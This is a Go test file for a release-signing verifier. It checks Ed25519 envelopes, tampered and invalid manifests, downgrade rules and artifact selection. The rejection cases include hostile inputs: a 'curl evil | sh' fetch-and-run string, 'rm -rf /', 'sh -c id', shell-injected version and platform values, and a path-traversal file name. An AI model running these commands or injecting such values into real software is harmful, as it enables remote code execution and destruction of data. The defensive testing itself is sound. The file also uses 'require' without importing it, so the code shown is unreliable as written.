package release

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"os"
	"strings"
	"testing"
)

type vector struct {
	PublicKey       string `json:"public_key"`
	KeyID           string `json:"key_id"`
	Envelope        string `json:"envelope"`
	ManifestBytes   string `json:"manifest_bytes"`
	ManifestDigest  string `json:"manifest_digest"`
	ReleaseSequence uint64 `json:"release_sequence"`
	Version         string `json:"version"`
	BuildCommit     string `json:"build_commit"`
	LinuxSHA256     string `json:"linux_amd64_sha256"`
}

func loadVector(t *testing.T) vector {
	t.Helper()
	raw, err := os.ReadFile("testdata/release_vector_v1.json")
	require.NoError(t, err)
	var v vector
	require.NoError(t, json.Unmarshal(raw, &v))
	return v
}

func vectorTrust(t *testing.T, v vector) TrustSet {
	t.Helper()
	pub, err := ParsePublicKey(v.PublicKey)
	require.NoError(t, err)
	set, err := NewTrustSet(pub)
	require.NoError(t, err)
	return set
}

// Cross-repository vector: MoonLightCloud pins the identical fixture and
// must reach the identical verdict, digest and identity (prompt §80).
func TestCrossRepoVectorVerifies(t *testing.T) {
	v := loadVector(t)
	verified, err := vectorTrust(t, v).Verify([]byte(v.Envelope))
	require.NoError(t, err)
	require.Equal(t, v.KeyID, verified.KeyID)
	require.Equal(t, v.ManifestDigest, verified.Digest)
	require.Equal(t, v.ManifestBytes, string(verified.ManifestBytes))
	require.Equal(t, v.ReleaseSequence, verified.Manifest.ReleaseSequence)
	require.Equal(t, v.Version, verified.Manifest.Version)
	require.Equal(t, v.BuildCommit, verified.Manifest.BuildCommit)
	artifact, err := SelectArtifact(verified.Manifest, "linux", "amd64", PackageTarGz)
	require.NoError(t, err)
	require.Equal(t, v.LinuxSHA256, artifact.SHA256)
	canonical, err := Canonical(verified.Manifest)
	require.NoError(t, err)
	require.Equal(t, v.ManifestBytes, string(canonical))
}

func mutateEnvelope(t *testing.T, raw string, f func(*Envelope)) []byte {
	t.Helper()
	var env Envelope
	require.NoError(t, json.Unmarshal([]byte(raw), &env))
	f(&env)
	out, err := json.Marshal(env)
	require.NoError(t, err)
	return out
}

func TestTamperedReleasesReject(t *testing.T) {
	v := loadVector(t)
	trust := vectorTrust(t, v)
	flip := func(s string, i int) string {
		b, _ := base64.StdEncoding.DecodeString(s)
		b[i] ^= 0x01
		return base64.StdEncoding.EncodeToString(b)
	}
	_, otherPriv, _ := ed25519.GenerateKey(rand.Reader)
	otherPub := otherPriv.Public().(ed25519.PublicKey)
	cases := map[string]struct {
		envelope []byte
		code     Code
	}{
		"one-byte manifest mutation":  {mutateEnvelope(t, v.Envelope, func(e *Envelope) { e.Manifest = flip(e.Manifest, 40) }), CodeSignatureInvalid},
		"one-byte signature mutation": {mutateEnvelope(t, v.Envelope, func(e *Envelope) { e.Signature = flip(e.Signature, 7) }), CodeSignatureInvalid},
		"truncated signature": {mutateEnvelope(t, v.Envelope, func(e *Envelope) {
			b, _ := base64.StdEncoding.DecodeString(e.Signature)
			e.Signature = base64.StdEncoding.EncodeToString(b[:63])
		}), CodeSignatureInvalid},
		"unknown key id":     {mutateEnvelope(t, v.Envelope, func(e *Envelope) { e.KeyID = "0000000000000000" }), CodeKeyUnknown},
		"unsigned (empty)":   {mutateEnvelope(t, v.Envelope, func(e *Envelope) { e.Signature = "" }), CodeSignatureInvalid},
		"unsupported format": {mutateEnvelope(t, v.Envelope, func(e *Envelope) { e.Format = "moonlight-release-envelope-v2" }), CodeManifestUnsupported},
		"wrong key, same id": {func() []byte {
			// A signature by a different key over identical bytes.
			var env Envelope
			_ = json.Unmarshal([]byte(v.Envelope), &env)
			manifest, _ := base64.StdEncoding.DecodeString(env.Manifest)
			env.Signature = base64.StdEncoding.EncodeToString(ed25519.Sign(otherPriv, SigningMessage(manifest)))
			out, _ := json.Marshal(env)
			return out
		}(), CodeSignatureInvalid},
		"oversized envelope":     {bytes.Repeat([]byte(" "), MaxEnvelopeBytes+1), CodeManifestInvalid},
		"not json":               {[]byte("sh -c 'curl evil | sh'"), CodeManifestInvalid},
		"unknown envelope field": {[]byte(strings.Replace(v.Envelope, `"format"`, `"command":"rm -rf /","format"`, 1)), CodeManifestInvalid},
		"duplicate envelope key": {[]byte(strings.Replace(v.Envelope, `"format"`, `"key_id":"4ce788bb4ea0950d","format"`, 1)), CodeManifestInvalid},
	}
	_ = otherPub
	for name, tc := range cases {
		_, err := trust.Verify(tc.envelope)
		require.Error(t, err, name)
		require.Equal(t, tc.code, CodeOf(err), name)
	}
	// The vector's key is unknown to an unrelated trust set.
	unrelated, err := NewTrustSet(otherPub)
	require.NoError(t, err)
	_, err = unrelated.Verify([]byte(v.Envelope))
	require.Equal(t, CodeKeyUnknown, CodeOf(err))
}

func newKey(t *testing.T) (ed25519.PrivateKey, TrustSet) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	require.NoError(t, err)
	trust, err := NewTrustSet(pub)
	require.NoError(t, err)
	return priv, trust
}

func sampleManifest(seq uint64) Manifest {
	return Manifest{ReleaseSequence: seq, Version: "1.0." + strings.Repeat("1", 1), BuildCommit: strings.Repeat("ab", 20),
		Artifacts: []Artifact{{OS: "linux", Arch: "amd64", Package: PackageTarGz, FileName: "MoonLightRetail-linux-amd64.tar.gz", Size: 10, SHA256: strings.Repeat("0", 64)}}}
}

// signRaw signs arbitrary bytes so structurally invalid but authentic
// manifests can be tested: authenticity never implies validity.
func signRaw(t *testing.T, priv ed25519.PrivateKey, manifest []byte) []byte {
	t.Helper()
	pub := priv.Public().(ed25519.PublicKey)
	env, err := json.Marshal(Envelope{Format: EnvelopeFormat, KeyID: KeyID(pub),
		Manifest:  base64.StdEncoding.EncodeToString(manifest),
		Signature: base64.StdEncoding.EncodeToString(ed25519.Sign(priv, SigningMessage(manifest)))})
	require.NoError(t, err)
	return env
}

func TestAuthenticButInvalidManifestsReject(t *testing.T) {
	priv, trust := newKey(t)
	keyID := KeyID(priv.Public().(ed25519.PublicKey))
	valid, err := Canonical(func() Manifest {
		m := sampleManifest(5)
		m.ManifestVersion = 1
		m.Product = Product
		m.KeyID = keyID
		return m
	}())
	require.NoError(t, err)
	_, err = trust.Verify(signRaw(t, priv, valid))
	require.NoError(t, err, "control: canonical manifest verifies")

	replace := func(old, new string) []byte { return []byte(strings.Replace(string(valid), old, new, 1)) }
	cases := map[string]struct {
		manifest []byte
		code     Code
	}{
		"future manifest version":    {replace(`"manifest_version":1`, `"manifest_version":2`), CodeManifestUnsupported},
		"non-canonical whitespace":   {append([]byte(" "), valid...), CodeManifestInvalid},
		"duplicate key":              {replace(`"product"`, `"version":"9.9.9","product"`), CodeManifestInvalid},
		"unknown field":              {replace(`"product"`, `"post_install":"sh -c id","product"`), CodeManifestInvalid},
		"wrong product":              {replace(`"moonlightretail"`, `"otherapp"`), CodeManifestInvalid},
		"short commit":               {replace(strings.Repeat("ab", 20), "abab"), CodeManifestInvalid},
		"shell-shaped version":       {replace(`"1.0.1"`, `"1.0;rm -rf"`), CodeManifestInvalid},
		"traversal file name":        {replace(`MoonLightRetail-linux-amd64.tar.gz`, `../../bin/sh`), CodeManifestInvalid},
		"malformed platform":         {replace(`"os":"linux"`, `"os":"linux;id"`), CodeManifestInvalid},
		"malformed arch":             {replace(`"arch":"amd64"`, `"arch":"x86"`), CodeManifestInvalid},
		"zero size":                  {replace(`"size":10`, `"size":0`), CodeManifestInvalid},
		"oversized artifact":         {replace(`"size":10`, `"size":1073741825`), CodeManifestInvalid},
		"zero sequence":              {replace(`"release_sequence":5`, `"release_sequence":0`), CodeManifestInvalid},
		"key id mismatch":            {replace(keyID, "0000000000000000"), CodeManifestInvalid},
		"min installed not previous": {replace(`"min_installed_sequence":0`, `"min_installed_sequence":5`), CodeManifestInvalid},
	}
	for name, tc := range cases {
		_, err := trust.Verify(signRaw(t, priv, tc.manifest))
		require.Error(t, err, name)
		require.Equal(t, tc.code, CodeOf(err), name)
	}
}

func TestSignRoundTripAndDigestStable(t *testing.T) {
	priv, trust := newKey(t)
	m := sampleManifest(7)
	m.Artifacts = append(m.Artifacts, Artifact{OS: "darwin", Arch: "arm64", Package: PackageTarGz, FileName: "mac.tar.gz", Size: 3, SHA256: strings.Repeat("1", 64)})
	env, signed, err := Sign(m, priv)
	require.NoError(t, err)
	verified, err := trust.Verify(env)
	require.NoError(t, err)
	require.Equal(t, signed.Digest, verified.Digest)
	require.Equal(t, "darwin", verified.Manifest.Artifacts[0].OS, "artifacts canonically ordered")
	again, _, err := Sign(m, priv)
	require.NoError(t, err)
	require.Equal(t, env, again, "Ed25519 signing of canonical bytes is deterministic")
}

// Anti-replay / anti-downgrade (prompt §83, §132).
func TestSequencePolicy(t *testing.T) {
	priv, trust := newKey(t)
	verify := func(seq uint64, version string) Verified {
		m := sampleManifest(seq)
		m.Version = version
		env, _, err := Sign(m, priv)
		require.NoError(t, err)
		v, err := trust.Verify(env)
		require.NoError(t, err)
		return v
	}
	ten := verify(10, "1.0.0")
	_, err := CheckSequence(10, ten.Digest, verify(9, "0.9.0"))
	require.Equal(t, CodeDowngradeRejected, CodeOf(err))
	decision, err := CheckSequence(10, ten.Digest, ten)
	require.NoError(t, err)
	require.Equal(t, DecisionAlreadyInstalled, decision)
	_, err = CheckSequence(10, ten.Digest, verify(10, "1.0.0-other"))
	require.Equal(t, CodeReleaseConflict, CodeOf(err), "same sequence, different digest")
	decision, err = CheckSequence(10, ten.Digest, verify(11, "1.1.0"))
	require.NoError(t, err)
	require.Equal(t, DecisionInstall, decision)

	m := sampleManifest(12)
	m.MinInstalledSequence = 11
	env, _, err := Sign(m, priv)
	require.NoError(t, err)
	gated, err := trust.Verify(env)
	require.NoError(t, err)
	_, err = CheckSequence(10, ten.Digest, gated)
	require.Equal(t, CodeIncompatible, CodeOf(err))
}

func TestSelectArtifactPlatform(t *testing.T) {
	m := sampleManifest(3)
	_, err := SelectArtifact(m, "windows", "amd64", PackageTarGz)
	require.Equal(t, CodePlatformUnsupported, CodeOf(err))
	_, err = SelectArtifact(m, "linux", "arm64", PackageTarGz)
	require.Equal(t, CodePlatformUnsupported, CodeOf(err))
	_, err = SelectArtifact(m, "linux", "amd64", "appimage")
	require.Equal(t, CodePlatformUnsupported, CodeOf(err))
	a, err := SelectArtifact(m, "linux", "amd64", PackageTarGz)
	require.NoError(t, err)
	require.Equal(t, int64(10), a.Size)
}

func TestTrustSetRejectsMalformedKeys(t *testing.T) {
	_, err := NewTrustSet(ed25519.PublicKey([]byte("short")))
	require.Error(t, err)
	_, err = ParsePublicKey("not-base64!")
	require.Error(t, err)
	empty, err := NewTrustSet()
	require.NoError(t, err)
	_, err = empty.Verify([]byte(loadVector(t).Envelope))
	require.Equal(t, CodeKeyUnknown, CodeOf(err), "an empty trust set trusts nothing")
}
